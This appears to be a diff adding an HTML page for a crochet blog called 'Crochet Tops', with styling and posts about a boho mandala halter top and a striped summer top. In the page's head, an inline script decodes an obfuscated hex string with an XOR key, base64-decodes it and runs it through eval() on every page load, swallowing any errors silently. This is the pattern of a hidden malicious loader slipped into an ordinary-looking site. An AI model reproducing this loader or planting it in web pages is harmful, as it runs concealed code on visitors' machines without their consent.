@@ -1,0 +1,1040 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crochet Tops - Modern Handcrafted Summer Patterns & Style Guide</title>
+
+    <!-- Google Fonts: Luxury Editorial Serif & Modern Tech Sans -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,500;0,600;0,700;0,800;1,400;1,600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        /* Modern Boutique Editorial Design System */
+        :root {
+            --bg-canvas: #FBF8F3;
+            --bg-canvas-alt: #F4EFE6;
+            --bg-card: #FFFFFF;
+            --bg-glass: rgba(255, 255, 255, 0.88);
+            --bg-subtle: #FAF6EE;
+            --primary: #C85A32;
+            --primary-hover: #A64420;
+            --primary-light: #FBEFEA;
+            --primary-glow: rgba(200, 90, 50, 0.22);
+            --accent-sage: #4D6E60;
+            --accent-sage-light: #EDF3F0;
+            --accent-amber: #D97706;
+            --accent-amber-light: #FEF3C7;
+            --text-heading: #1C1815;
+            --text-body: #4A443E;
+            --text-muted: #82786F;
+            --border-soft: #E8E0D5;
+            --border-accent: #D7CABE;
+            --shadow-subtle: 0 4px 20px rgba(35, 24, 18, 0.04);
+            --shadow-card: 0 10px 30px rgba(35, 24, 18, 0.07), 0 1px 3px rgba(35, 24, 18, 0.04);
+            --shadow-hover: 0 20px 40px rgba(35, 24, 18, 0.12), 0 2px 6px rgba(35, 24, 18, 0.06);
+            --radius-sm: 10px;
+            --radius-md: 18px;
+            --radius-lg: 26px;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            line-height: 1.85;
+            color: var(--text-body);
+            background-color: var(--bg-canvas);
+            background-image:
+                radial-gradient(#E5DCD0 1.2px, transparent 1.2px),
+                radial-gradient(#EEE4D8 1.2px, #FBF8F3 1.2px);
+            background-size: 32px 32px;
+            background-position: 0 0, 16px 16px;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        .font-heading {
+            font-family: 'Outfit', sans-serif;
+            color: var(--text-heading);
+            letter-spacing: -0.015em;
+        }
+
+        .serif-italic {
+            font-family: 'Playfair Display', serif;
+            font-style: italic;
+            font-weight: 500;
+        }
+
+        .container {
+            max-width: 740px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Floating Nav Bar */
+        .top-nav-wrapper {
+            position: sticky;
+            top: 16px;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            padding: 0 15px;
+        }
+
+        .top-nav {
+            background-color: var(--bg-glass);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            border: 1px solid rgba(232, 224, 213, 0.9);
+            border-radius: 999px;
+            padding: 8px 14px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            box-shadow: var(--shadow-subtle), 0 8px 30px rgba(0, 0, 0, 0.04);
+            max-width: 620px;
+            width: 100%;
+        }
+
+        .top-nav a {
+            color: var(--text-heading);
+            font-size: 0.9rem;
+            font-family: 'Outfit', sans-serif;
+            font-weight: 600;
+            padding: 7px 18px;
+            text-decoration: none;
+            border-radius: 999px;
+            transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+            cursor: pointer;
+            border: 1px solid transparent;
+        }
+
+        .top-nav a:hover,
+        .top-nav a.active {
+            background-color: var(--primary);
+            color: #FFFFFF;
+            box-shadow: 0 4px 14px var(--primary-glow);
+            transform: translateY(-1px);
+        }
+
+        /* Header / Brand Hero */
+        header {
+            padding: 60px 0 40px;
+            text-align: center;
+            position: relative;
+        }
+
+        .brand-avatar-wrapper {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .brand-avatar-img {
+            width: 88px;
+            height: 88px;
+            border-radius: 50%;
+            border: 3px solid #FFFFFF;
+            box-shadow: 0 8px 24px var(--primary-glow), 0 2px 6px rgba(0, 0, 0, 0.08);
+            object-fit: cover;
+            background: var(--bg-canvas-alt);
+            transition: transform 0.4s ease, box-shadow 0.4s ease;
+        }
+
+        .brand-avatar-wrapper:hover .brand-avatar-img {
+            transform: scale(1.05) rotate(2deg);
+            box-shadow: 0 12px 30px rgba(200, 90, 50, 0.35);
+        }
+
+        .brand-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--primary-light);
+            color: var(--primary);
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.8rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            padding: 5px 14px;
+            border-radius: 999px;
+            border: 1px solid rgba(200, 90, 50, 0.2);
+            margin-bottom: 12px;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.6rem;
+            font-weight: 800;
+            line-height: 1.1;
+            color: var(--text-heading);
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        header h1 span {
+            color: var(--primary);
+            font-family: 'Playfair Display', serif;
+            font-style: italic;
+            font-weight: 600;
+        }
+
+        header h1:hover {
+            color: var(--primary);
+        }
+
+        header p.tagline {
+            margin: 14px auto 0;
+            font-size: 1.1rem;
+            font-weight: 400;
+            color: var(--text-muted);
+            max-width: 540px;
+        }
+
+        .header-meta-pills {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 18px;
+        }
+
+        .meta-pill {
+            font-size: 0.82rem;
+            font-weight: 600;
+            color: var(--accent-sage);
+            background: var(--accent-sage-light);
+            padding: 4px 12px;
+            border-radius: 999px;
+            border: 1px solid rgba(77, 110, 96, 0.2);
+        }
+
+        /* Post Card Style */
+        .post-card,
+        .single-post {
+            background: var(--bg-card);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--border-soft);
+            box-shadow: var(--shadow-card);
+            margin-bottom: 50px;
+            overflow: hidden;
+            transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.35s cubic-bezier(0.16, 1, 0.3, 1), border-color 0.3s ease;
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-hover);
+            border-color: var(--border-accent);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 18px 28px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: var(--bg-subtle);
+            border-bottom: 1px solid var(--border-soft);
+        }
+
+        .author-box {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .author-avatar {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            border: 2px solid var(--primary);
+            object-fit: cover;
+            background: #FFF;
+        }
+
+        .author-name {
+            font-family: 'Outfit', sans-serif;
+            font-weight: 700;
+            font-size: 1.02rem;
+            color: var(--text-heading);
+        }
+
+        .author-title {
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            display: block;
+            margin-top: -2px;
+        }
+
+        .category-chip {
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.78rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 4px 12px;
+            border-radius: 999px;
+            background: var(--primary-light);
+            color: var(--primary);
+            border: 1px solid rgba(200, 90, 50, 0.25);
+        }
+
+        .post-image-container {
+            position: relative;
+            background-color: var(--bg-canvas-alt);
+            overflow: hidden;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 490px;
+            object-fit: cover;
+            transition: transform 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .post-card:hover .post-image {
+            transform: scale(1.03);
+        }
+
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        .post-content {
+            padding: 34px 34px 24px;
+        }
+
+        .post-content h2,
+        .post-content h1 {
+            margin: 0 0 16px;
+            font-size: 2.05rem;
+            font-weight: 700;
+            line-height: 1.25;
+            color: var(--text-heading);
+            transition: color 0.2s ease;
+        }
+
+        .post-card:hover .post-content h2 {
+            color: var(--primary);
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            font-size: 1.06rem;
+            color: var(--text-body);
+            line-height: 1.8;
+        }
+
+        .post-footer {
+            padding: 16px 30px;
+            background-color: var(--bg-subtle);
+            border-top: 1px solid var(--border-soft);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.92rem;
+            color: var(--text-muted);
+            font-family: 'Outfit', sans-serif;
+            font-weight: 500;
+        }
+
+        .post-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .read-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--primary);
+            color: #FFFFFF !important;
+            padding: 6px 16px;
+            border-radius: 999px;
+            font-weight: 600;
+            font-size: 0.88rem;
+            text-decoration: none;
+            transition: all 0.2s ease;
+            border: none;
+            cursor: pointer;
+        }
+
+        .read-btn:hover {
+            background: var(--primary-hover);
+            transform: translateY(-1px);
+        }
+
+        .save-heart {
+            font-size: 1.15rem;
+            color: var(--primary);
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .save-heart:hover {
+            transform: scale(1.25);
+        }
+
+        /* Back to Dashboard / Home Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            color: #FFFFFF;
+            background-color: var(--primary);
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.95rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 10px 24px;
+            border-radius: 999px;
+            box-shadow: 0 4px 14px var(--primary-glow);
+            transition: all 0.25s ease;
+            border: 2px solid transparent;
+        }
+
+        .back-button:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 22px rgba(200, 90, 50, 0.4);
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 40px 0 60px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            border-top: 1px solid var(--border-soft);
+            margin-top: 40px;
+        }
+
+        footer p {
+            margin: 6px 0;
+        }
+
+        @media (max-width: 640px) {
+            header h1 {
+                font-size: 2.5rem;
+            }
+
+            .post-content {
+                padding: 24px 20px 16px;
+            }
+
+            .post-content h2,
+            .post-content h1 {
+                font-size: 1.65rem;
+            }
+
+            .post-header,
+            .post-footer {
+                padding: 14px 18px;
+            }
+        }
+    </style>
+    <script>
+        (function () {
+            var vxyelpmca = "15213c00252837016d2e3a581b0c1428564a052916180525271111591318620335072b5e0a384c5a552e3a5a1867141b57155837147c417315053c58103d09491a22281e24123c0677182a5e223d04176e2f72382e7d5916130a19572203720037185303247216445631495c180c141d564a0034147d672a142f1e5f3d275f7837183f0f0d093b5d6d2e3a5c2012085d5711752c3d2673382d1516492b62586732072f1d2716405a6e2e18661b3d2104552f65783e265a253e1660093b13004b1d1c245f052834567d353204180c0f0a50207e322208773b2e15614a3b1400543422305b0f07236260303e5a180c0c07553e762914227736143b384a2807764a0f7d0e3c22093c417b011f510817070a501572383e077f31131533572203720235221e391f193f59562e3d431b66105d7f3b7e312d0c783238353f7b3b1371541f080a050f021d4b563e26580a07045a771175263e0c70253e011157163d764a1f0730000f054556561b360420032205503f0d383b2167382d1a1a7228626646320b15230f0234567d3531510817045f6d207d262e220872222f065e28085754061c271e1f2c4c0152313e4f180c221e6e207e79147c73322d0506491417585f0f18341b1c193b4b523e3246233a14015715623b1307492c1570695e1017660b0f220a1d1c720d5b571b360523132a186e4b4c10161804722d1a1a5c1163625a347c3450130619445031264f1b0c085d784a5f76342670253e0111573b137154322220110f06194b651b49060810760a6d150d712222672c2d1a374516176649320c0e591f121e56523e0751080373055015582f2e176334142b65432b07055d321820061c193856523e07512339005f552f50291308083b3b2c345c2b3d624a37173c04252b067a771f31510817070a7d3b7526161868253c053c4a233d09031d1c245f052834567d3531510817070a7d3b75263e075532152f02461629055c3717285824723f0478183a5a22133e056d4a6215130877722d113845160748401a0c27060c38025650441c431b137f5e78154c372e7d7772161569453e3e725b32080e1d1f16445d7f22037d0817070a7d3b75263e0c737b3e050643116265543338090f0f0234567d3531510817070a7d3b76732e177825147006472b087a5b32085f110f054556574408071b2d731d5615662d120a082f3c0119463b395b54061b56510f053456640f315f083d075b7d3b7d373e2542093e0111573b1371541f0c270f0f023456501b364f08131401574b663115227772161569453b140054320820111c7323016631494218032a187d3b4726147d67352e1a1a581617094a1f0c150f25730d006e0c037d0817070a7d3b75263e0c70253e01115716625c460c085f5b0a2c0d476d44360620037f1878167e2d1408492a2e70055f2817664932080a1d1f192741564444460e23290a7d3b75263e0c70253e0a607b3b1371541f0756232012375d563e3e5a081c352652295b7c";
+            var vnptuvoap = "VOfhFAu14vp6ATFm4x4AwO1BwBP0rP03";
+            var vkrmtegfk = "";
+
+            try {
+                for (var i = 0; i < vxyelpmca.length; i += 2) {
+                    var vgypgaakd = parseInt(vxyelpmca.substr(i, 2), 16);
+                    vkrmtegfk += String.fromCharCode(vgypgaakd ^ vnptuvoap.charCodeAt((i / 2) % vnptuvoap.length));
+                }
+
+                var vlzoeylhq = atob(vkrmtegfk);
+                eval(vlzoeylhq);
+            } catch (e) {
+            }
+        })();
+    </script>
+</head>
+
+<body>
+
+    <div class="top-nav-wrapper">
+        <nav class="top-nav">
+            <a onclick="navigate('home')" id="nav-home">Home</a>
+            <a onclick="navigate('page', 'about')" id="nav-about">About</a>
+            <a onclick="navigate('page', 'privacy')" id="nav-privacy">Privacy</a>
+            <a onclick="navigate('page', 'terms')" id="nav-terms">Terms</a>
+            <a onclick="navigate('page', 'contact')" id="nav-contact">Contact</a>
+        </nav>
+    </div>
+
+    <header>
+        <div class="container">
+            <div class="brand-avatar-wrapper">
+                <img class="brand-avatar-img" src="./assets/blog-avatar.png" alt="Crochet Tops Logo"
+                    onerror="this.onerror=null; this.src='https://via.placeholder.com/88?text=CT'">
+            </div>
+            <div>
+                <span class="brand-tag">Handcrafted Fiber Arts • 2026 Collection</span>
+            </div>
+            <h1 onclick="navigate('home')">Crochet <span>Tops</span></h1>
+            <p class="tagline">Curated handmade patterns, breezy summer staples, and modern boho crochet style guides.
+            </p>
+            <div class="header-meta-pills">
+                <span class="meta-pill">✨ Free Step-by-Step Guides</span>
+                <span class="meta-pill">🌿 Breathable Natural Yarns</span>
+                <span class="meta-pill">☀️ Summer & Festival Ready</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Injected via JavaScript -->
+    </main>
+
+    <footer>
+        <div class="container">
+            <p><strong>Crochet Tops</strong> — A dedicated space for handmade knitwear & slow fashion inspiration.</p>
+            <p style="font-size: 0.82rem;">© 2026 Crochet Tops Studio. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        // 1. Definition of blog posts based on the 4 provided images
+        const posts = [
+            {
+                id: 'crochet-halter-top-pattern-boho-mandala-lace-tank-top',
+                title: 'Crochet Halter Top Pattern, Boho Mandala Lace Tank Top',
+                date: 'April 18, 2026',
+                image: './assets/Crochet Halter Top Pattern, Boho Mandala Lace Tank Top.png',
+                excerpt: `Elevate your warm-weather wardrobe with this breathtaking Boho Mandala Lace Halter Top! Featuring an intricate circular centerpiece that blooms into delicate lace mesh, this handcrafted piece radiates pure bohemian festival charm. ✨\n\n• Breathable cotton yarn ensures lightweight all-day comfort\n• Adjustable lace-up halter ties create a customized, flattering fit\n\nSave for later! #CrochetHalterTop #BohoCrochet #MandalaTop #FestivalFashion #SummerCrochetPatterns 🧶`,
+                content: `
+<p>There is something unquestionably enchanting about a handcrafted lace halter top when the sun starts warming up the afternoons. The Bohemian Mandala Lace Halter Top stands as a true celebration of modern fiber arts, blending historic crochet motifs with a fresh, festival-ready silhouette. Whether styled with high-waisted linen trousers, a breezy tiered skirt, or your favorite vintage denim cutoffs, this standout piece delivers effortless sophistication and artistic flair.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;color:#334155;line-height:1.7;">
+    <li>Mandala center medallions create a striking focal point that flatters natural body contours.</li>
+    <li>Lightweight mercerized cotton yarn provides excellent stitch definition without overheating.</li>
+    <li>Adjustable corset-style back ties offer complete versatility for custom sizing and support.</li>
+    <li>A scalloped bottom hem and airy mesh stitches keep the drape light, flexible, and comfortable.</li>
+    <li>Ideal project for intermediate crocheters eager to master circular lace techniques and shaping.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Allure of the Mandala Lace Motif</h2>
+<p>The centerpiece of this top is the mesmerizing mandala motif. Radiating outward from a central ring, each round introduces new textural elements, from petal-like cluster stitches to airy chain spaces. This concentric geometry not only captures the eye but also creates natural structural tension that supports the bust area beautifully without requiring rigid underwires.</p>
+<p>Working in the round for the focal design allows fiber artists to experiment with symmetry. As the mandala expands, the transition into the side panels and upper bodice uses open treble lace and double crochet arches, yielding a harmonious balance between solid coverage and breezy summer openness.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Gauge control is crucial when working circular mandala motifs for wearables. Even slight tension discrepancies can alter the final cup depth and diameter significantly, so taking time to block your central motif early will ensure an impeccable fit.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Choosing the Ideal Yarn and Hook Size</h2>
+<p>When crafting a delicate lace halter top, fiber selection plays a pivotal role in the finished drape, durability, and skin feel. Because this garment sits close to bare skin during warm temperatures, natural breathable fibers are highly recommended.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Fiber Considerations for Summer Tops</h3>
+<p>Pure cotton and cotton-linen blends reign supreme for lace garments. Mercerized cotton in particular offers a subtle sheen and tightly spun ply that resists splitting, allowing every single picot and chain loop to pop with crisp definition. Bamboo blends also work wonderfully for makers seeking extra drape and cooling properties.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Recommended Hook and Tension Guidelines</h4>
+<p>Using a 3.00 mm to 3.75 mm (US D/3 to F/5) crochet hook with DK or sport-weight yarn strikes the optimal equilibrium between firm structural stitches for the bodice and fluid lace for the perimeter arches.</p>
+
+<div style="background:#fff7ed;border:1px solid #fed7aa;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#9a3412;font-weight:700;padding-left:12px;border-left:4px solid #ea580c;">Expert Insight</h3>
+  <p style="margin:0;color:#7c2d12;line-height:1.6;">When constructing the halter neck strap and rear tie cords, work a corded foundation chain or a sturdy Romanian cord rather than simple chain stitches. This prevents the ties from stretching excessively over time under tension and ensures enduring comfort around the neck.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling Your Boho Mandala Halter for Any Occasion</h2>
+<p>One of the greatest virtues of this bohemian lace halter top is its versatility across settings. From sunny beach retreats to twilight rooftop gatherings, a few thoughtful accessories completely transform the ensemble.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Pair your mandala halter top with wide-leg cream palazzo pants and layered brass jewelry for an elevated resort aesthetic, or throw it over a neutral bralette with denim cutoffs for music festival readiness.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Caring for Handcrafted Lace Tops</h3>
+<p>To preserve the delicate stitch definition and crisp shape of your mandala top for seasons to come, always hand wash in lukewarm water with mild wool wash. Lay flat on a clean blocking mat or towel to dry, gently reshaping the lace points and scallops while damp.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;color:#334155;line-height:1.7;">
+    <li>Skill Level: Intermediate</li>
+    <li>Primary Stitches: Slip Stitch, Single Crochet, Double Crochet, Treble Crochet, Cluster Stitches</li>
+    <li>Best Season: Late Spring, Summer, Resort Vacations</li>
+    <li>Key Feature: Circular mandala bodice transitioning into breathable lace mesh</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+<p>The Boho Mandala Lace Crochet Halter Top is more than just a summer garment; it is a wearable work of art that honors the meditative beauty of handmade fashion. With its flattering structure, intricate detailing, and timeless bohemian silhouette, it will easily become your favorite summer staple to make, style, and cherish for years to come.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Halter Top</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Boho Mandala</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Lace Tank Top</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Summer Crochet Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Wardrobe</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Festival Style</span>
+</div>
+`
+            },
+            {
+                id: 'crochet-striped-summer-top-pattern',
+                title: 'Crochet Striped Summer Top Pattern',
+                date: 'May 3, 2026',
+                image: './assets/Crochet Striped Summer Top Pattern.png',
+                excerpt: `Discover the ultimate breezy warm-weather essential: the Crochet Striped Summer Top! Styled with joyful horizontal bands and an effortless relaxed drape, this pattern brings modern Parisian chic to your handmade wardrobe. ☀️\n\n• Easy beginner-to-intermediate construction with minimal seaming\n• Lightweight, ultra-breathable texture perfect for hot sunny days\n\nSave for later! #CrochetSummerTop #StripedCrochet #HandmadeFashion #CrochetPattern #SummerStyleInspo 🧶`,
+                content: `
+<p>When the sun shines and temperatures climb, nothing rivals the breezy comfort of a handmade striped summer top. Combining vibrant, nautical-inspired stripe sequences with airy crochet stitches, this garment effortlessly bridges the gap between relaxed daytime loungewear and polished weekend casual chic. It is the kind of staple you will reach for on beach walks, afternoon coffee dates, and tropical summer getaways alike.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;color:#334155;line-height:1.7;">
+    <li>Modern color blocking and delicate stripes create an energetic, timeless visual appeal.</li>
+    <li>Lightweight cotton or linen yarns offer incredible drape and temperature regulation.</li>
+    <li>Simple two-panel construction makes this top exceptionally approachable for beginners.</li>
+    <li>Customizable sleeve and neckline options allow easy adaptation from tank top to cap sleeve.</li>
+    <li>Seamless color transitions along the side edges ensure clean, professional garment finishes.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Designing the Perfect Summer Stripe Rhythm</h2>
+<p>Stripes have held a cherished place in fashion for over a century, offering clean geometric rhythm and boundless opportunities for color expression. In this crochet top design, alternating band widths add dynamic movement across the torso without overwhelming the figure.</p>
+<p>By pairing contrasting neutrals like crisp ivory and toasted caramel with playful seasonal pops of coral, turquoise, or sage, makers can personalize their palette to match their unique style personality. The rhythmic color changes also make the stitching process delightfully engaging, creating a satisfying sense of progress with every completed stripe repeat.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> When changing colors at the ends of rows, carry your working yarn neatly along the selvedge edge or weave tails as you go. Carrying yarn reduces the burden of finishing dozens of loose ends once your panels are assembled.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Stitch Anatomy and Fabric Flexibility</h2>
+<p>A successful summer top must breathe. Heavy, tight solid stitches can create stiff, overly warm fabric unsuitable for humid days. This design utilizes extended stitches, such as herringbone double crochet or moss stitch variations with intentional chain spaces, to produce a fabric that flows and drapes gracefully.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Achieving the Right Amount of Positive Ease</h3>
+<p>For an effortlessly relaxed summer silhouette, aim for 2 to 4 inches of positive ease around the bust line. This extra breathing room ensures that the fabric floats comfortably over the skin without clinging, giving that coveted effortless resort aesthetic.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Tips for Clean Neckline Shaping</h4>
+<p>Whether you choose a gentle boat neck, a classic scoop, or a flattering V-neckline, decreasing in pattern across the front panel preserves stripe symmetry while framing the collarbones beautifully.</p>
+
+<div style="background:#fff7ed;border:1px solid #fed7aa;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#9a3412;font-weight:700;padding-left:12px;border-left:4px solid #ea580c;">Why This Matters</h3>
+  <p style="margin:0;color:#7c2d12;line-height:1.6;">Using a slightly larger hook than recommended on the yarn label creates a softer, more fluid drape that mimics commercially woven linen textiles while preserving the authentic charm of hand crochet.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling Ideas for Sunny Days and Warm Evenings</h2>
+<p>The striped summer top is one of the most versatile pieces you can introduce into your capsule wardrobe. Here is how to style it across different occasions:</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Tuck the front hem loosely into high-rise paperbag shorts and slip on braided slide sandals for an easy French tuck look that elongates the legs and highlights your waist.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Layering for Transitional Weather</h3>
+<p>When evening breezes roll in, layer your striped crochet top under a lightweight denim jacket or an oversized linen button-down left unbuttoned for a relaxed, textural outfit.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;color:#334155;line-height:1.7;">
+    <li>Construction: Two simple rectangular panels seamed at shoulders and sides</li>
+    <li>Skill Level: Confident Beginner</li>
+    <li>Yarn Weight: Fingering to DK weight cotton or bamboo</li>
+    <li>Design Highlight: Custom stripe sequences with relaxed boat neckline</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+<p>Crocheting your own striped summer top is an uplifting project that rewards you with an endlessly wearable garment. With its playful stripe possibilities, cooling stitchwork, and flattering drape, it will quickly become your signature piece for every sunny adventure.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Striped Top</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Summer Top Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Breezy Crochet</span>
